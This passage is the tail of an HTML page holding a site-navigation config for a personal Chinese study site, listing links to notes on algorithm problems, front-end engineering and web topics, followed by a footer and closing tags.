"/算法/回溯算法(DFS深度优先遍历)/46.全排列.md\"},{\"text\":\"47.全排列-ii\",\"link\":\"/算法/回溯算法(DFS深度优先遍历)/47.全排列-ii.md\"},{\"text\":\"77.组合\",\"link\":\"/算法/回溯算法(DFS深度优先遍历)/77.组合.md\"},{\"text\":\"78.子集\",\"link\":\"/算法/回溯算法(DFS深度优先遍历)/78.子集.md\"},{\"text\":\"90.子集-ii\",\"link\":\"/算法/回溯算法(DFS深度优先遍历)/90.子集-ii.md\"},{\"text\":\"index\",\"link\":\"/算法/回溯算法(DFS深度优先遍历)/index.md\"},{\"text\":\"pic\",\"collapsible\":true,\"collapsed\":false,\"items\":[]}]},{\"text\":\"图论\",\"collapsible\":true,\"collapsed\":true,\"items\":[{\"text\":\"797.所有可能的路径\",\"link\":\"/算法/图论/797.所有可能的路径.md\"},{\"text\":\"index\",\"link\":\"/算法/图论/index.md\"}]},{\"text\":\"括号相关的问题\",\"collapsible\":true,\"collapsed\":true,\"items\":[{\"text\":\"1541.平衡括号字符串的最少插入次数\",\"link\":\"/算法/括号相关的问题/1541.平衡括号字符串的最少插入次数.md\"},{\"text\":\"20.有效的括号\",\"link\":\"/算法/括号相关的问题/20.有效的括号.md\"},{\"text\":\"22.括号生成\",\"link\":\"/算法/括号相关的问题/22.括号生成.md\"},{\"text\":\"921.使括号有效的最少添加\",\"link\":\"/算法/括号相关的问题/921.使括号有效的最少添加.md\"},{\"text\":\"index\",\"link\":\"/算法/括号相关的问题/index.md\"}]},{\"text\":\"排序、查找算法\",\"collapsible\":true,\"collapsed\":true,\"items\":[{\"text\":\"pictures\",\"collapsible\":true,\"collapsed\":false,\"items\":[]},{\"text\":\"test\",\"link\":\"/算法/排序、查找算法/test.md\"},{\"text\":\"排序算法\",\"link\":\"/算法/排序、查找算法/排序算法.md\"},{\"text\":\"查找算法\",\"link\":\"/算法/排序、查找算法/查找算法.md\"}]},{\"text\":\"数组\",\"collapsible\":true,\"collapsed\":true,\"items\":[{\"text\":\"index\",\"link\":\"/算法/数组/index.md\"},{\"text\":\"二分搜索\",\"collapsible\":true,\"collapsed\":true,\"items\":[{\"text\":\"34.在排序数组中查找元素的第一个和最后一个位置\",\"link\":\"/算法/数组/二分搜索/34.在排序数组中查找元素的第一个和最后一个位置.md\"},{\"text\":\"35.搜索插入位置\",\"link\":\"/算法/数组/二分搜索/35.搜索插入位置.md\"},{\"text\":\"704.二分查找\",\"link\":\"/算法/数组/二分搜索/704.二分查找.md\"},{\"text\":\"index\",\"link\":\"/算法/数组/二分搜索/index.md\"}]},{\"text\":\"二维数组花式遍历技巧\",\"collapsible\":true,\"collapsed\":true,\"items\":[{\"text\":\"48.旋转图像\",\"link\":\"/算法/数组/二维数组花式遍历技巧/48.旋转图像.md\"},{\"text\":\"54.螺旋矩阵\",\"link\":\"/算法/数组/二维数组花式遍历技巧/54.螺旋矩阵.md\"},{\"text\":\"index\",\"link\":\"/算法/数组/二维数组花式遍历技巧/index.md\"}]},{\"text\":\"前缀和\",\"collapsible\":true,\"collapsed\":true,\"items\":[{\"text\":\"2389.和有限的最长子序列\",\"link\":\"/算法/数组/前缀和/2389.和有限的最长子序列.md\"},{\"text\":\"303.区域和检索-数组不可变\",\"link\":\"/算法/数组/前缀和/303.区域和检索-数组不可变.md\"},{\"text\":\"304.二维区域和检索-矩阵不可变\",\"link\":\"/算法/数组/前缀和/304.二维区域和检索-矩阵不可变.md\"},{\"text\":\"53.最大子数组和\",\"link\":\"/算法/数组/前缀和/53.最大子数组和.md\"},{\"text\":\"index\",\"link\":\"/算法/数组/前缀和/index.md\"}]},{\"text\":\"去重\",\"collapsible\":true,\"collapsed\":true,\"items\":[{\"text\":\"316.去除重复字母\",\"link\":\"/算法/数组/去重/316.去除重复字母.md\"}]},{\"text\":\"双指针\",\"collapsible\":true,\"collapsed\":true,\"items\":[{\"text\":\"11.盛最多水的容器\",\"link\":\"/算法/数组/双指针/11.盛最多水的容器.md\"},{\"text\":\"15.三数之和\",\"link\":\"/算法/数组/双指针/15.三数之和.md\"},{\"text\":\"16.最接近的三数之和\",\"link\":\"/算法/数组/双指针/16.最接近的三数之和.md\"},{\"text\":\"876.链表的中间结点\",\"link\":\"/算法/数组/双指针/876.链表的中间结点.md\"},{\"text\":\"index\",\"link\":\"/算法/数组/双指针/index.md\"},{\"text\":\"左右指针\",\"collapsible\":true,\"collapsed\":false,\"items\":[{\"text\":\"1574.删除最短的子数组使剩余数组有序\",\"link\":\"/算法/数组/双指针/左右指针/1574.删除最短的子数组使剩余数组有序.md\"},{\"text\":\"167.两数之和-ii-输入有序数组\",\"link\":\"/算法/数组/双指针/左右指针/167.两数之和-ii-输入有序数组.md\"},{\"text\":\"344.反转字符串\",\"link\":\"/算法/数组/双指针/左右指针/344.反转字符串.md\"},{\"text\":\"5.最长回文子串\",\"link\":\"/算法/数组/双指针/左右指针/5.最长回文子串.md\"},{\"text\":\"647.回文子串\",\"link\":\"/算法/数组/双指针/左右指针/647.回文子串.md\"},{\"text\":\"index\",\"link\":\"/算法/数组/双指针/左右指针/index.md\"}]},{\"text\":\"快慢指针\",\"collapsible\":true,\"collapsed\":false,\"items\":[{\"text\":\"26.删除有序数组中的重复项\",\"link\":\"/算法/数组/双指针/快慢指针/26.删除有序数组中的重复项.md\"},{\"text\":\"27.移除元素\",\"link\":\"/算法/数组/双指针/快慢指针/27.移除元素.md\"},{\"text\":\"283.移动零\",\"link\":\"/算法/数组/双指针/快慢指针/283.移动零.md\"},{\"text\":\"index\",\"link\":\"/算法/数组/双指针/快慢指针/index.md\"}]}]},{\"text\":\"差分数组\",\"collapsible\":true,\"collapsed\":true,\"items\":[{\"text\":\"1094.拼车\",\"link\":\"/算法/数组/差分数组/1094.拼车.md\"},{\"text\":\"1109.航班预订统计\",\"link\":\"/算法/数组/差分数组/1109.航班预订统计.md\"},{\"text\":\"index\",\"link\":\"/算法/数组/差分数组/index.md\"}]},{\"text\":\"滑动窗口\",\"collapsible\":true,\"collapsed\":true,\"items\":[{\"text\":\"1004.最大连续-1-的个数-iii\",\"link\":\"/算法/数组/滑动窗口/1004.最大连续-1-的个数-iii.md\"},{\"text\":\"1456.定长子串中元音的最大数目\",\"link\":\"/算法/数组/滑动窗口/1456.定长子串中元音的最大数目.md\"},{\"text\":\"219.存在重复元素-ii\",\"link\":\"/算法/数组/滑动窗口/219.存在重复元素-ii.md\"},{\"text\":\"3.无重复字符的最长子串\",\"link\":\"/算法/数组/滑动窗口/3.无重复字符的最长子串.md\"},{\"text\":\"438.找到字符串中所有字母异位词\",\"link\":\"/算法/数组/滑动窗口/438.找到字符串中所有字母异位词.md\"},{\"text\":\"53.最大子数组和\",\"link\":\"/算法/数组/滑动窗口/53.最大子数组和.md\"},{\"text\":\"567.字符串的排列\",\"link\":\"/算法/数组/滑动窗口/567.字符串的排列.md\"},{\"text\":\"76.最小覆盖子串\",\"link\":\"/算法/数组/滑动窗口/76.最小覆盖子串.md\"},{\"text\":\"904.水果成篮\",\"link\":\"/算法/数组/滑动窗口/904.水果成篮.md\"},{\"text\":\"index\",\"link\":\"/算法/数组/滑动窗口/index.md\"}]}]},{\"text\":\"最大堆\",\"collapsible\":true,\"collapsed\":true,\"items\":[{\"text\":\"MaxHeap\",\"link\":\"/算法/最大堆/MaxHeap.md\"},{\"text\":\"最大堆\",\"link\":\"/算法/最大堆/最大堆.md\"}]},{\"text\":\"设计数据结构\",\"collapsible\":true,\"collapsed\":true,\"items\":[{\"text\":\"146.lru-缓存\",\"link\":\"/算法/设计数据结构/146.lru-缓存.md\"},{\"text\":\"239.滑动窗口最大值(单调队列)\",\"link\":\"/算法/设计数据结构/239.滑动窗口最大值(单调队列).md\"},{\"text\":\"380.o-1-时间插入、删除和获取随机元素\",\"link\":\"/算法/设计数据结构/380.o-1-时间插入、删除和获取随机元素.md\"},{\"text\":\"单调栈\",\"collapsible\":true,\"collapsed\":true,\"items\":[{\"text\":\"index\",\"link\":\"/算法/设计数据结构/单调栈/index.md\"}]}]},{\"text\":\"链表\",\"collapsible\":true,\"collapsed\":true,\"items\":[{\"text\":\"双指针技巧 - 单链表\",\"collapsible\":true,\"collapsed\":true,\"items\":[{\"text\":\"141.环形链表\",\"link\":\"/算法/链表/双指针技巧 - 单链表/141.环形链表.md\"},{\"text\":\"160.相交链表\",\"link\":\"/算法/链表/双指针技巧 - 单链表/160.相交链表.md\"},{\"text\":\"21.合并两个有序链表\",\"link\":\"/算法/链表/双指针技巧 - 单链表/21.合并两个有序链表.md\"},{\"text\":\"83.删除排序链表中的重复元素\",\"link\":\"/算法/链表/双指针技巧 - 单链表/83.删除排序链表中的重复元素.md\"},{\"text\":\"86.分隔链表\",\"link\":\"/算法/链表/双指针技巧 - 单链表/86.分隔链表.md\"},{\"text\":\"876.链表的中间结点\",\"link\":\"/算法/链表/双指针技巧 - 单链表/876.链表的中间结点.md\"},{\"text\":\"index\",\"link\":\"/算法/链表/双指针技巧 - 单链表/index.md\"}]},{\"text\":\"递归反转单链表\",\"collapsible\":true,\"collapsed\":true,\"items\":[{\"text\":\"206.反转链表\",\"link\":\"/算法/链表/递归反转单链表/206.反转链表.md\"},{\"text\":\"25.k-个一组翻转链表\",\"link\":\"/算法/链表/递归反转单链表/25.k-个一组翻转链表.md\"},{\"text\":\"92.反转链表-ii\",\"link\":\"/算法/链表/递归反转单链表/92.反转链表-ii.md\"}]}]},{\"text\":\"随机算法\",\"collapsible\":true,\"collapsed\":true,\"items\":[{\"text\":\"384.打乱数组\",\"link\":\"/算法/随机算法/384.打乱数组.md\"},{\"text\":\"398.随机数索引\",\"link\":\"/算法/随机算法/398.随机数索引.md\"},{\"text\":\"528.按权重随机选择\",\"link\":\"/算法/随机算法/528.按权重随机选择.md\"}]}],\"/工程化\":[{\"text\":\"Webpack-学习笔记\",\"link\":\"/工程化/Webpack-学习笔记.md\"},{\"text\":\"包管理相关npm，yarn，pnpm\",\"link\":\"/工程化/包管理相关npm，yarn，pnpm.md\"},{\"text\":\"性能优化、监控相关\",\"link\":\"/工程化/性能优化、监控相关.md\"}],\"/其他\":[{\"text\":\"前端渲染方案：CSR、SSR、SSG\",\"link\":\"/其他/前端渲染方案：CSR、SSR、SSG.md\"},{\"text\":\"单页面应用路由-hash、history模式\",\"link\":\"/其他/单页面应用路由-hash、history模式.md\"},{\"text\":\"浏览器跨域、网络安全、攻击防范\",\"link\":\"/其他/浏览器跨域、网络安全、攻击防范.md\"},{\"text\":\"登陆校验方案：cookie，JWT\",\"link\":\"/其他/登陆校验方案：cookie，JWT.md\"},{\"text\":\"网络请求axios、fetch\",\"link\":\"/其他/网络请求axios、fetch.md\"}]},\"socialLinks\":[{\"icon\":\"github\",\"link\":\"https://github.com/wanwenyun/\"}],\"footer\":{\"message\":\"弯弯个人小站\",\"copyright\":\"Copyright © 2023-2023 wanwan \"},\"outlineTitle\":\"当前页\",\"base\":\"/web-/\"},\"locales\":{},\"scrollOffset\":90,\"cleanUrls\":false}")</script>
    
  </body>
</html>